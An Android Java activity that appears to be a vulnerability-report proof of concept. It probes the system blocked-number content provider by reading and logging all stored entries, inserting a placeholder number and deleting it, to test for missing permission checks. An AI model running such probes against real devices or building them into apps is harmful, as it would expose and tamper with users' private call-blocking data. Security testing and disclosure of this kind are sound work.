package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.database.Cursor;

public class BlockedNumPoc extends Activity {
    private static final String TAG = "BlockedNumPoc";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Uri BLOCKED_URI = Uri.parse("content://com.android.blockednumber/blocked");
        
        // Try to read blocked numbers
        try {
            Cursor cursor = getContentResolver().query(BLOCKED_URI, null, null, null, null);
            if (cursor != null) {
                Log.d(TAG, "READ SUCCESS: Got " + cursor.getCount() + " blocked numbers");
                while (cursor.moveToNext()) {
                    for (int i = 0; i < cursor.getColumnCount(); i++) {
                        Log.d(TAG, "  " + cursor.getColumnName(i) + "=" + cursor.getString(i));
                    }
                }
                cursor.close();
            } else {
                Log.d(TAG, "READ: cursor is null");
            }
        } catch (Exception e) {
            Log.e(TAG, "READ FAILED: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        
        // Try to insert a blocked number
        try {
            ContentValues values = new ContentValues();
            values.put("original_number", "+15551234567");
            Uri result = getContentResolver().insert(BLOCKED_URI, values);
            Log.d(TAG, "INSERT SUCCESS: " + result);
        } catch (Exception e) {
            Log.e(TAG, "INSERT FAILED: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        
        // Try to delete
        try {
            int deleted = getContentResolver().delete(BLOCKED_URI, "original_number=?", 
                new String[]{"+15551234567"});
            Log.d(TAG, "DELETE: removed " + deleted + " entries");
        } catch (Exception e) {
            Log.e(TAG, "DELETE FAILED: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        
        finish();
    }
}
